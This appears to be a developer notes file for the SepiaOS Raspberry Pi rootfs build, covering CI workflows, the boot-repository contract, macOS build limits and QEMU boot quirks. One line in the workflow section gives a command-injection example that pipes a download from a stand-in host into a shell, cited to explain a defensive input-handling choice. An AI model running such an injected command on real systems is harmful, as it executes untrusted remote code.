- **`|| true` on those pipelines is load-bearing.** The recipes run under `set -e` with `pipefail`, so an unreachable host, or a `grep` that matches nothing, takes the recipe down *at the assignment* — before any of the fallback logic can look at the empty result. The first version of this fix was written without it and silently skipped every fallback; the tests below are what caught it. Same trap as the `-v8+` greps in step 5.
- Tested by pointing the primary at `https://127.0.0.1:1/…`, which fails instantly: primary → mirror 1 → mirror 2 → cached tarball → a clear error naming `MUSL_VERSION=`, all four exercised.

**A wrong first guess worth recording**: the failure was at 137 s, which is also almost exactly where the GitHub API call for the boot release lands in a cold build, and CI was passing no token — so this looked like the documented 60-requests-an-hour-per-IP limit. It was not. `gh run view --log-failed` settled it in one command; the step timings from the public API were enough to narrow it down but not to identify it. **Read the log before theorising.** (`GITHUB_TOKEN: ${{ github.token }}` was added to both workflows anyway — the Makefile has always honoured it, hosted runners do share egress IPs, and it costs nothing.)

### How the workflows work

Both mirror `../boot`'s, because the two repositories are cut the same way and there is no reason for them to differ. `ci.yml` runs on every push to every branch and on pull requests against main; `release.yml` is `workflow_dispatch` only.

- **Both build in `debian:trixie-slim`, and the container is not decoration.** QEMU's `raspi4b` machine arrived in QEMU 9.0; Debian 12 ships 7.2 and Ubuntu 24.04 ships 8.2, so on a bare runner the Pi 4 and CM4 smoke tests could not run at all. Trixie ships 10.x. Before changing the image, check `qemu-system-aarch64 -machine help | grep raspi4b`.
- **Tools are installed before `actions/checkout`**, deliberately: without git in the container, checkout silently falls back to downloading a tarball, and the Makefile needs git for the module fetch and the musl version lookup.
- **`downloads/` is cached, and the cache is restored *after* checkout**, never before — checkout runs `git clean -ffdx` on an existing workspace and would delete it. The cache pays for itself on the ~600 MiB cross-toolchain alone. Everything in there is keyed by version or tag and immutable, so a stale entry is only ever unused, never wrong; that is what makes the loose `restore-keys` prefix safe.
- **CI is one job, not a matrix over boards.** The build produces a single card that is supposed to boot all four, and four parallel jobs would each build their own image — testing four different cards rather than the claim being made. They really would differ: the image is not byte-reproducible, because mke2fs stamps a random filesystem UUID. The cost is wall-clock time rather than confidence.
- `QEMU_TIMEOUT` is raised to 300 in CI. Hosted runners are x86_64, so the AArch64 guests run under full TCG emulation, several times slower than the machine this was developed on. A generous cap costs nothing, because each run stops as soon as its serial log says what it was waiting for.
- **The release branches main into `rel-<version>` before building, not after.** Everything then happens on that branch — build, tests, tag — so the released commit is on a branch that still exists afterwards, whatever main does next. The gate job validates the version and refuses an existing branch, tag or release before the half-hour build starts.
- **`inputs.version` reaches bash through the environment, never through `${{ }}` interpolation**, because `${{ }}` is substituted before bash sees the line: a version of `x"; curl evil | sh; #` would otherwise run.
- The release's `prerelease` input does double duty: it marks the GitHub release *and* selects `CHANNEL`, so a full release takes the latest full release of the boot partition and a pre-release takes the latest pre-release. It defaults to true, because `Sepia-OS/boot` has no full release yet and a `CHANNEL=release` build would stop with "has no full release yet".
- The release notes are filled in from `build/rootfs/etc/os-release` in the built tree, so the boot release, firmware tag and kernel versions they quote cannot drift from what was actually built. GitHub attaches the tag's source archives itself, which is the "with the sources" half of the requirement.

### What was checked, and how

The workflows cannot be run here, so the parts that could be were checked directly:

- **The Linux build path had never been exercised** before this — every build until now used the macOS toolchain. Running the CI's own container (`docker run --platform linux/arm64 debian:trixie-slim`) with the CI's own package list built the image end to end, including the Arm `14.3.rel1` `aarch64-none-linux-gnu` toolchain that only Linux hosts download. The package list is therefore known-complete rather than plausible.
- **The whole pipeline was then run in that container**: `make image`, `make smoke` (all four boards to a login prompt) and `make grow-check`, against Debian's QEMU 10.0.11 rather than the Homebrew 11.1.0 everything else was developed on. Green. The one thing this cannot show is the x86_64 TCG timing, which is why `QEMU_TIMEOUT` is raised rather than left at its default.
- **Build inside the container's filesystem, not a bind mount.** A first attempt bind-mounting the working tree from macOS failed in e2fsprogs with `chmod: changing permissions of 'compile_et': Permission denied` — an artifact of Docker Desktop's shared filesystem, not of the build. GitHub's workspace is an ordinary filesystem, so this does not apply there, but it is worth knowing before concluding the build is broken.
- All four boards were booted locally to a login prompt from one image, and the first-boot resize was checked on `pi4` as well as `pi3` — the Pi 4 is the case where the card is `mmcblk1`, so it is the one that proves `sepia-firstboot` resolves the disk from sysfs rather than assuming a name.

### Make dependency layout

`Makefile` is a prerequisite of the things that are **built** (`boot.img`, the musl install, the busybox binary, the module install, the staged tree, the image) but deliberately **not** of the things that are **resolved** (`*/version.env`, `boot/release.env`) or **fetched** (`modules/.fetched`). Editing a recipe should rebuild; it must never re-run a "latest" lookup and quietly move the project onto a newer upstream release, or re-clone 54 MiB of modules. The toolchain is left out of even the build half — its version is part of its path, and re-extracting 600 MiB on every edit would be absurd.

## What This Repository Is For

SepiaOS is an operating system for Raspberry Pi that reuses the kernel and firmware from Raspberry Pi OS; everything above the kernel is custom. Targets: Pi Zero 2 W, Pi 3, Pi 4, Pi 5, CM4, CM5.

This repository is the `rootfs` component. Per `README.md` the pipeline is:

1. Fetch the boot partition from the `Sepia-OS/boot` release (pre-release builds take the latest pre-release; release builds take the latest release).
2. Fetch an aarch64 cross-toolchain — macOS build host gets the macOS toolchain, Linux host the Linux one.
3. Build the latest musl libc release, both static and dynamic.
4. Build the latest busybox release as a **dynamic** executable against that musl.
5. Fetch the Raspberry Pi kernel modules and install them under `/lib/modules`.
6. Create an ext4 rootfs on the Linux FHS holding musl, busybox and the modules, and assemble a bootable image with the boot partition. It boots to a login prompt and drops into the user's shell; `root` exists with password `sepiaos`, forced to change on first login.
7. On first boot, grow the rootfs to fill the storage device minus a swap partition (1/2/4 GiB by device size), activate swap, then reboot.
8. Test the image by booting it under QEMU as a Pi 3, and ship a launch script that does the same interactively.

Step 7 shapes step 6: the shipped image is sized to its contents, not to any particular card, so the rootfs partition is deliberately small and the first boot rewrites the partition table in place and runs `resize2fs` before rebooting. That needs a once-only marker (Raspberry Pi OS uses a `cmdline.txt` `init=` hand-off plus a flag file) — a resize that repeats on every boot, or that runs against a mounted-read-write filesystem, is the failure mode to design against.

All eight steps of `README.md` are implemented. What is *not* here: nothing has been run on real hardware, so `config.txt`, device-tree auto-selection and overlays remain untested; there is no networking, no package management and no release/CI wiring (`dist/` is still empty and `.github/` has no workflow); and the image is not reproducible byte-for-byte, because mke2fs stamps a random filesystem UUID and the file timestamps come from the build.

The sibling repositories live beside this one: [../boot](../boot) (a complete, working Makefile build — the closest model for what this repo should look like).

## The Contract With the `boot` Repository

These are the facts the rootfs build has to match; all were read out of `../boot`, not from documentation:

- **Only one boot asset is published**, `sepiaos-boot-universal-v<version>.img.xz`, alongside a `SHA256SUMS` file. There are no per-board assets — `BOARD=universal` builds a single card carrying every board's firmware, kernels and device trees, and the firmware picks the right ones at power-on. So the rootfs image is likewise one card for all six boards.
- **The release body is part of the interface, not just prose.** It names the firmware tag as a table row, ``| Raspberry Pi firmware | `1.20260521` |``, and step 5 parses that to know which kernel modules match the shipped kernel. If `../boot` ever restyles its release notes, `modules` stops with a message asking for `FIRMWARE_TAG=` — it does not silently fetch the wrong kernel's modules.
- Releases are cut by a manual `workflow_dispatch` with a `prerelease` boolean, so "latest pre-release" vs "latest release" is a real distinction on the GitHub releases API (`gh release list`, `gh release view --json isPrerelease`).
- The boot image is a **64 MiB MBR disk image** (`IMAGE_SIZE_MIB`), one FAT32 partition of type `0x0c` starting at 4 MiB — matching Raspberry Pi OS. The rootfs partition is therefore partition 2, appended after it. Measured on `v0.1.0` via `gmake boot-info`: partition 1 starts at sector 8192 and runs 122880 sectors, so **the rootfs begins at sector 131072** (64 MiB in).
- The boot partition's generated `cmdline.txt` says `root=/dev/mmcblk0p2 rootfstype=ext4 fsck.repair=yes rootwait`. **The rootfs must be ext4 on partition 2**, or `CMDLINE_ROOT` has to be overridden when building boot.
- A boot partition alone panics at `VFS: Unable to mount root fs`. That is boot's expected end state and this repository's starting point — the first milestone is turning that panic into an init.
- `../boot/Makefile` exposes `make -s print-<VAR>` (e.g. `print-IMAGE`, `print-FIRMWARE_TAG`) for scripts and CI to read a variable without parsing output.

## Build Environment

The user develops on macOS (`darwin`). Constraints inherited from `../boot`, each of which silently produces a broken result if violated:

- **GNU Make ≥ 4.0 is required — `gmake`, not `/usr/bin/make`.** Make 3.81 (macOS's) compares timestamps only to the second and will use stale outputs after a fast edit. `../boot/Makefile` hard-errors on it; do the same here.
- **macOS has no `sfdisk`, no loop mounts, no `mkfs.ext4`.** `../boot` routes everything through `mtools` so the build stays unprivileged and cross-platform. FAT has an mtools equivalent; **ext4 does not** — creating the rootfs partition on macOS without root is the central unsolved problem of this build, and is worth deciding deliberately (`e2fsprogs` from Homebrew, a Linux container, or a `genext2fs`-style tool) before writing the image rules.
- Boot artifacts are built in `debian:trixie-slim` in CI because mtools decides the FAT layout; shipping an image built elsewhere would ship one that the boot checks never ran against.

## QEMU Caveats

These apply the moment this repository boots an image, and each one reads like a broken image when it isn't:

- **QEMU never runs the VideoCore boot chain** — it ignores `bootcode.bin`, `start.elf` and `config.txt` on the card. The kernel and DTB must be passed as `-kernel`/`-dtb`. No `-kernel` produces *no output at all*.
- **`earlycon=` is mandatory** or the serial console stays silent — the kernel stalls before `ttyAMA0` registers. PL011 base per SoC: `0x3f201000` (BCM2837), `0xfe201000` (BCM2711).
- **QEMU rejects any SD image whose size is not a power of two**, which is why `IMAGE_SIZE_MIB` is validated. Testing the first-boot resize means padding a copy of the image up to a larger power of two — 4 GiB is a good size, because it is the smallest that leaves room for both the growth and the 1 GiB swap partition the README asks for below 64 GB.
- **The serial console under QEMU is output-only, so you cannot log in over it.** With `-machine raspi3b` and the Pi 6.18 kernel the PL011 comes up as a console with *no tty device behind it*: `/proc/consoles` shows `ttyAMA1  -W- (EC N  a)  204:65` — `-W-` meaning write, no read — `/sys/class/tty` has no `ttyAMA` entry at all, and `/dev/ttyAMA1` does not exist. Creating the node from that major:minor and opening it fails with ENXIO. Kernel messages and everything userspace prints appear on `-serial`, and nothing typed into it arrives. An interactive session has to use the framebuffer VT (`console=tty1`) with a QEMU display, which is what README step 8 asks for anyway.
- **`console=ttyAMA0` under QEMU binds nothing** for the same reason — the port is `ttyAMA1` there. Everything still *looks* fine, because `earlycon=pl011,0x3f201000` writes to the UART registers directly and keeps printing; what is lost is `/dev/console`, which then cannot be opened at all, so userspace gets no console and no login prompt. `../boot`'s `boot-check` passes `console=ttyAMA0` and only greps for `mmcblk*: p1`, so it never noticed. Use `console=ttyAMA1,115200` when booting a full image.
- **A getty belongs on `console`, not on the console's device name.** Any console the kernel is actually using can be reached through `/dev/console`; its own device node is the thing that may not exist. That is what `sepia-gettys` does with the console `/proc/consoles` flags `C`, using device names only for the others.
- **The Pi 4 exposes the card as `mmcblk1` under QEMU but `mmcblk0` on real hardware**, so the QEMU `-append` root device and the `root=` in `cmdline.txt` legitimately differ.
- The Zero 2 W device tree faults on `raspi3ap`; emulate it as `raspi3b`.
- A green QEMU boot proves the kernel, the partition layout, that init runs, that the first-boot resize works and that a login prompt appears. It proves nothing about `config.txt`, device-tree auto-selection or overlays — only real hardware tests those. It also says nothing about which tty the console lands on for a real board, since QEMU's answer to that is its own.
